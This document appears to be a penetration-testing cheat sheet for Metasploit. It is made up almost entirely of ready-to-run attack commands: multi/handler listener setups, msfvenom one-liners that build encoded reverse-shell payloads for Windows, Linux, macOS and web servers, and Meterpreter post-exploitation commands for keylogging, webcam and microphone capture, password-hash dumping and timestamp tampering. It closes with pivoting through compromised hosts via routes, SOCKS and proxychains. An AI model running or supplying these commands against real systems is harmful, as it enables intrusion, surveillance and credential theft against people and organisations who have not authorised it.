---
title: Metasploit
category: Exploitation
order: 4
---

> **Useage** 

Start Postgress | <code> </code>
Start w/ RC File | <code> msfconsole -r meta_config </code>
Example RC file | <code> use exploit/multi/handler <br> set PAYLOAD windows/meterpreter/reverse_https <br> set LHOST 10.10.75.1 <br> set LPORT 8443 <br> set ExitOnSession false <br> exploit -j </code>
Run a rc file | <code> resource [location of RC file] </code>
location | <code> /opt/metasploit-4.11/ or /usr/share/framework2/ </code>
Exploit Location | <code> [location]/apps/pro/msf3/modules/exploits/ </code>
Payload Location | <code> [location]/apps/pro/msf3/modules/payloads </code>
run | <code> ./app/msfconssole </code>
Show Exploits | <code> show exploits </code>
Find Exploits | <code> search multi/handler or search android </code>
Info about Exploits | <code> info exploit/multi/handler </code>
Use Exploit | <code> use exploit/multi/handler </code>
Show Payloads | <code> show payloads </code>
Set Payload | <code> set PAYLOAD windows/shell/reverse_tcp </code>
Show Options on Payload | <code> show options </code>
Set Remote Hosts | <code> set RHOST 10.10.77.1 </code>
Set Global Hosts | <code> setg RHOST 10.10.77.1 </code>
Set Local Hosts | <code> set LHOST 10.10.75.1 </code>
Exit on Session | <code> set ExitOnSession false </code>
Exploit as Job | <code> exploit -j </code>
list running jobs | <code> jobs </code>
List sessions | <code> sessions -l </code>
Interact with session | <code> session -i [n] </code>
Background a shell | <code> CTRL-Z </code>
Kill sessions  | <code> sessions -K </code>
Add a route | <code> route add [victim2 subnet] [netmask] [sid] </code> 
Errno:ECONNECT RESET | Reason: Windows Antivirus on client

> **Database** 

Commands | db_connect, db_disconnect, db_driver, db_status, db_export
Data | hosts, vulns, services, creds, loot, notes
Populate Hosts/Ports | use auxiliary/scanner/protscan/[tcp or syn] <br> use auxiliary/discovery/udp_sweep <br> db_nmap
Manually | hosts --add/--delete [host]<br> services --add/--delete -p [port] -r [proto] -s [name] [host1, host2,...] <br> notes --add/--delete -r [type] -n '[note text]' [host1, host2,...]
Import | db_import Nmap XML (-oX option) Nessus XMLv2 or XMLv2 (.nessus)
Hosts Help and Search | hosts -h <br> host -S linux -R (adds to RHOST)
Vulnearabilities | vulns -h <br> vulns -S RPC <br> vulns -P 445

> **MSFVenom**

Example | <code> msfvenom -p windows/shell/reverse_tcp LHOST=10.10.75.1 LPORT=8080 -f exe > /tmp/file.exe </code>
Shell Code| <code> msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" </code>
Shell Code for Threaded Apps | <code> msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 ExITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
Encoded shell code for JS or HTML (client side) | <code> msfvenom -p windows/shell_revers-tcp LHOST=192.168.2.1 LPORT=443 -f js_le --platform windows -a x86 -e generic/none
Payloads | msfvenom -l payloads
Bad Characters | -b "\x00\x0a\x0d"
Help | msfvenom --help-formats

**Windows:**

Binary | <code> msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f exe > shell.exe </code>
Powershell Reflection | <code> msfvenom -p windows/meterpreter/reverse_https lhost=[attacker] lport=[attackerport] -f psh-reflection -a x86 > output.txt </code> 
Powershell Command | <code> msfvenom –a x86 –platform windows –p windows/meterpreter/reverse_https LHOST=[attackerIP] LPORT=[attackerPort] -e x86/shikata_ga_nai –f psh-cmd </code> 

**Linux:**

Binary | <code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f elf > shell.elf </code>
Python | <code> msfvenom -p cmd/unix/reverse_python LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f raw > shell.py </code>
Bash | <code> msfvenom -p cmd/unix/reverse_bash LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f raw > shell.sh </code>
Perl | <code> msfvenom -p cmd/unix/reverse_perl LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f raw > shell.pl </code> 

**Mac:** 

Binary | <code> msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f macho > shell.macho </code>

**Web:**

PHP | <code> msfvenom -p php/meterpreter_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f raw > shell.php <br> cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php </code>
ASP | <code>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f asp > shell.asp </code> 
JSP | <code> msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f raw > shell.jsp </code>
WAR | <code> msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f war > shell.war </code>

**Shellcode:**

Linux | <code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f [language] </code>
Windows | <code> msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f [language] </code>
Mac | <code> msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f [language] </code>

> **Meterpreter**

Get system info | sysinfo
Read Registry | reg
Change local directory | lcd
Download and Upload | download/upload
Make/Remove Directory | mkdir/rmdir
Edit a file | edit
Get the PID | getpid
Get the users ID | getuid
process list | ps
Drop to Command Prompt | Shell
Terminate Program | kill [pid]
Run a program | execute [program]
Change process | migrate [PID]
Display Routing Table | route
TCP relay | portfwd add -l 1111 -p 80 -r Target 2
Screen Shot | screenshot -p [filename.jpg]
List Webcams and take a picture | webcam_list, webcam_snap
Record Microphone | record_mic -d [Seconds]
Keylogger | keyscan_start, keyscan_stop, keyscan_dump
modules | data/meterpreter/
Load Module | use [last component of dll name]
priv modules | hashdump (SAM database), timestomp (MACE dates/times)
Port Scanner | meterpreter > load msfmap <br> meterpreter > msfmap

> **Route and Proxychain**

* Metasploit:

{% highlight bash %}
meterpreter > ipconfig 
Broadcom 440x 10/100 Integrated Controller - Packet Scheduler Miniport
Hardware MAC: 00:0b:db:1d:d3:2b
IP Address : 192.168.15.3
Netmask : 255.255.255.0

meterpreter > run arp_scanner -r 192.168.15.1/24
[*] ARP Scanning 192.168.15.1/24
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff

route add 192.168.15.1 255.255.255.0 1

msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.15.1
RHOSTS => 192.168.15.1
msf auxiliary(tcp) > set PORTS 1-1024
PORTS => 1-1024

msf auxiliary(tcp) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options
msf auxiliary(socks4a) > set SRVHOST 159.203.173.82
SRVHOST => 159.203.173.82
msf auxiliary(socks4a) > run
{% endhighlight %}

* Proxy Chain Configuration:

{% highlight bash %}
vi /etc/proxychains.conf 
#comment out DNS
#Change sock4 to:
socks4 [IP of Attack Machine] [PORT of attach machine]

proxychains nmap -sT -P0 10.0.0.10

{% endhighlight %}

> **Resources**

* [Metasploit Module to Standalone Exploit](https://netsec.ws/?p=262)
* [Metasploit Module to Standalone Exploit](https://www.theweakestlink.es/index.php/2016/04/18/from-metasploit-module-to-pyhton-standalone-with-the-help-of-wireshark/)
* [Metasploit Module to Standalone Exploit](https://www.shellcode.it/article/convert-msf-module/)
* [Common Commands](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#common-metasploit-modules)






